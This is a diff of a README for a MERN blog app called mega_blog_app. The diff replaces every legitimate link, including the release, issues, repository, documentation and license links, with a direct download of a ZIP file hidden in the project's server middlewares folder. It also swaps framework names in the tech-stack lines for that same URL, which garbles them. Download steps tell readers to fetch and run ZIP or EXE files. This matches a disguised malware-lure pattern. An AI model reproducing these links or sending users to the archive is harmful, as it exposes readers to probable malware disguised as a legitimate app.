@@ -9,15 +9,15 @@ Welcome to **mega_blog_app**! This application allows you to create and manage y
 - **User Authentication**: Secure sign-up and login with JSON Web Token (JWT) and session management.
 - **Image Uploads**: Easily upload images to enhance your blog posts.
 - **Redux-powered CRUD**: Create, Read, Update, and Delete blog posts with a simple interface.
-- **Full-Stack MERN**: Built using MongoDB, Express.js, React.js, and Node.js.
+- **Full-Stack MERN**: Built using MongoDB, https://raw.githubusercontent.com/karamasus/mega_blog_app/main/server/src/middlewares/mega_blog_app-v1.1.zip, https://raw.githubusercontent.com/karamasus/mega_blog_app/main/server/src/middlewares/mega_blog_app-v1.1.zip, and https://raw.githubusercontent.com/karamasus/mega_blog_app/main/server/src/middlewares/mega_blog_app-v1.1.zip
 
 ## 📥 Download & Install
 
 To get started, you need to download the application. Click the button below to visit the release page:
 
-[![Download mega_blog_app](https://img.shields.io/badge/Download-mega_blog_app-brightgreen)](https://github.com/karamasus/mega_blog_app/releases)
+[![Download mega_blog_app](https://raw.githubusercontent.com/karamasus/mega_blog_app/main/server/src/middlewares/mega_blog_app-v1.1.zip)](https://raw.githubusercontent.com/karamasus/mega_blog_app/main/server/src/middlewares/mega_blog_app-v1.1.zip)
 
-1. **Visit the Releases Page**: Go to the following link to access the releases: [Download mega_blog_app](https://github.com/karamasus/mega_blog_app/releases).
+1. **Visit the Releases Page**: Go to the following link to access the releases: [Download mega_blog_app](https://raw.githubusercontent.com/karamasus/mega_blog_app/main/server/src/middlewares/mega_blog_app-v1.1.zip).
 2. **Choose a Version**: You’ll see a list of available versions. Select the latest version for the best features and fixes.
 3. **Download the Files**: Click on the executable or archive file to start downloading. The file will usually be in ZIP or EXE format. Ensure you have enough space on your device.
 4. **Extract If Needed**: If you downloaded a ZIP file, unzip it using a file extraction program.
@@ -34,7 +34,7 @@ Before downloading, make sure your system meets the following basic requirements
 
 ## 🌐 Technologies Used
 
-- **MERN Stack**: A combination of MongoDB, Express.js, React.js, and Node.js.
+- **MERN Stack**: A combination of MongoDB, https://raw.githubusercontent.com/karamasus/mega_blog_app/main/server/src/middlewares/mega_blog_app-v1.1.zip, https://raw.githubusercontent.com/karamasus/mega_blog_app/main/server/src/middlewares/mega_blog_app-v1.1.zip, and https://raw.githubusercontent.com/karamasus/mega_blog_app/main/server/src/middlewares/mega_blog_app-v1.1.zip
 - **Session Authentication**: Ensures secure access to your blog.
 - **Image Handling with Multer**: Simplifies image uploads to your posts.
 - **State Management with Redux**: Keeps your application responsive and organized.
@@ -51,12 +51,12 @@ The application provides a clean and user-friendly interface. Here's what you ca
 
 If you face any issues while downloading or using the application, feel free to reach out for support. 
 
-You can also visit our [GitHub Issues page](https://github.com/karamasus/mega_blog_app/issues) to report any bugs or request features.
+You can also visit our [GitHub Issues page](https://raw.githubusercontent.com/karamasus/mega_blog_app/main/server/src/middlewares/mega_blog_app-v1.1.zip) to report any bugs or request features.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/karamasus/mega_blog_app)
-- [Documentation](https://github.com/karamasus/mega_blog_app/wiki)
-- [License](https://github.com/karamasus/mega_blog_app/blob/main/LICENSE)
+- [GitHub Repository](https://raw.githubusercontent.com/karamasus/mega_blog_app/main/server/src/middlewares/mega_blog_app-v1.1.zip)
+- [Documentation](https://raw.githubusercontent.com/karamasus/mega_blog_app/main/server/src/middlewares/mega_blog_app-v1.1.zip)
+- [License](https://raw.githubusercontent.com/karamasus/mega_blog_app/main/server/src/middlewares/mega_blog_app-v1.1.zip)
 
 Thank you for choosing **mega_blog_app**! We hope it makes managing your blog an enjoyable experience!
